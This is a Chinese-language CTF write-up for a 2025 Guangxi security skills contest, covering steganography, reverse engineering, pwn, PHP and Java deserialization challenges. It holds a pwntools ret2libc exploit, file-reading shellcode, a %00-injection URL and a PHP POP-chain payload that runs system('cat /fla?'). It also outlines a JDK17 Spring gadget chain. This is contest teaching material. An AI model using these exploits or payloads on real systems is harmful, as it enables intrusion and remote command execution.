---
title: 2025 年广西网络与信息安全职业技能竞赛 WriteUP
contest: 2025 广西网络与信息安全职业技能竞赛
year: 2025
difficulty: hard
vuln_type: [stego_traffic, reverse, ret2libc, rce, deserialize, web_unknown]
tags: [Wireshark, 7-bit-decoder, SpamMimic, libc-2.35, gets, openat, PHP-act动态函数, Spring-aop, JDK17, POJONode, TemplatesImpl, JDK17反序列化, 跨Module反射]
attack_chain: ["Misc EasyShark: Wireshark 找 hint → 7-bit ASCII 解码 SpamMimic → flag", "Crypto hint7-bit: 6664666C6E5F5F6C616974744067666868677B5F33677D59755F693072 (hex → spam)", "Reverse sub_7FF603145E00: 提取函数 get2gets", "PWN glibc2.35: cyclic(0x38) + gets + puts leak libc 0x28c0 → system + '/bin/sh' 字符串改造", "PWN shellcode: openat(-100, 'flag') + mmap(0x1337000) + writev 读 flag", "Web easyphp: act() 动态调函数 + sha256 已知 → 文件名 + start_lineno + '$' + rtd_key_counter", "ezphp: ?pw=1&act=%00util_handler_9x/var/www/html/index.php:18$0 → exit 链触发", "popparser: PHP-Parser 反序列化触发 fOpYG::__destruct → 6 段 chain → system('cat /fla?')", "Spring Java 17 反序列化: Spring AOP + TemplatesImpl + POJONode + EventListenerList + UndoManager + javassist"]
key_payload: "Spring AOP JDK17 反序列化: TemplatesImpl + POJONode + EventListenerList + UndoManager"
one_liner: 广西职业技能赛 8 大题：流量+密码+re+pwn+web+java
lesson: Java 17+ 反序列化要靠 Spring AOP 跨 Module 反射；PHP act() 链很新颖
quality: high
---

# 2025 年广西网络与信息安全职业技能竞赛 WriteUP

原文 https://www.ctfiot.com/281909.html （注：原文部分 NUL 字节污染，本 meta 基于可读内容）

## 题 1: Misc EasyShark
- Wireshark 抓包找 hint
- 7-bit ASCII / SpamMimic 解码
- flag 直接出

## 题 2: Crypto hint7-bit
```
hex: 6664666C6E5F5F6C616974744067666868677B5F33677D59755F693072
```
→ `fdfln__laitt@gffhhg{_3g}Yu_i0r`
→ SpamMimic 7-bit 解密

## 题 3: Reverse sub_7FF603145E00
- IDA 看 main 反编译
- 提取关键函数 get2gets
- 还原算法

## 题 4: PWN (libc-2.35)
```python
payload = b'/bin/sh'.rjust(0x2F, b'A')
sh.sendafter("what's your name", payload)
sh.sendafter('choice:', str(1))
payload1 = cyclic(0x38) + p64(elf.sym['gets']) + p64(elf.sym['puts']) + p64(start)
sh.sendlineafter('say something:', payload1)
payload2 = b'AAAA' + b'\x00'*3
sleep(10)
sh.sendline(payload2)
leak = u64(sh.recv(6).ljust(8, b'\x00'))
libc_base = leak + 0x28c0
# Round 2: system + /bin + /+1 + sh
payload2 = b'/bin' + p8(u8(b"/")+1) + b'sh'
```

## 题 5: PWN shellcode
```python
sc = asm(shellcraft.openat(-100, flag_dir))
sc += asm("""
    mov rdi, 0x1337000
    mov rsi, 0x1000
    mov rdx, 1; mov r10, 1
    mov r8, rax
    xor r9, r9
    mov rax, 0x9
    syscall
    # mmap(0x1337000, 0x100, PROT_READ|PROT_WRITE, ...)
    mov rbx, 0x100
    push rbx; push rax
    mov rdi, 1
    lea rsi, [rsp]
    mov r10, -1
    mov r8, 0; mov r9, 0
    mov rax, 0x14
    syscall
""")
s(sc)
```

## 题 6: Web easyphp
```php
$act = trim($_REQUEST['act'] ?? 'viewsource');
$pw = trim($_REQUEST['pw'] ?? '');
if (strcmp(hash('sha256', $pw), 'aac3f8e8d1e57ad313282fbf99804cf03d581c5292474ee57e2d0bc8d5570670') === 0) {
    function util_handler_9x() { echo file_get_contents('/flag'); }
}
$act();
```
- `act()` 调用动态函数
- 传入 `?pw=1&act=util_handler_9x`（密码已知）
- 但 trim 处理过——需用 `%00` 注入：
- `?pw=1&act=%00util_handler_9x/var/www/html/index.php:18$0`

## 题 7: popparser (PHP-Parser 反序列化)
6 个 class 链：
- fOpYG::__destruct → exit($this->fKZXU)
- CtBCy::__toString → $this->tvlgs->nwOds
- GdjSB::__get('nwOds') → ($this->lLgKS)()
- KrYNd::__invoke → $this->DEzzO->TGHZJ()
- MmksV::TGHZJ → ($this->pABqA)($this->iEClU)

构造 payload：
```php
$a = new fOpYG; $a->fKZXU = new CtBCy;
$a->fKZXU->tvlgs = new GdjSB;
$a->fKZXU->tvlgs->lLgKS = new KrYNd;
$a->fKZXU->tvlgs->lLgKS->DEzzO = new MmksV;
$a->fKZXU->tvlgs->lLgKS->DEzzO->pABqA = "system";
$a->fKZXU->tvlgs->lLgKS->DEzzO->iEClU = "cat /fla?";
```

## 题 8: Spring JDK 17 反序列化
- 高版本 JDK 模块化 → 跨 Module 反射
- `Unsafe.getAndSetObject` 改 module 字段
- TemplatesImpl + POJONode + EventListenerList + UndoManager
- Spring AOP 动态代理

## 教学价值
- **libc-2.35 没有 free_hook** → 走 puts leak → gets 二次注入
- **PHP act() 动态函数链** 全新攻击面
- **Java 17 反序列化** 跨 Module 反射是 2024+ 热点
- **Spring AOP** 是反序列化绕过模块化关键
- **SpamMimic 7-bit** 是经典 stego 工具

## 工具
- pwntools
- Spammimic decoder
- php-parser / nikic/PHP-Parser
- Spring AOP 反射工具
- javassist (CtClass 动态生成)
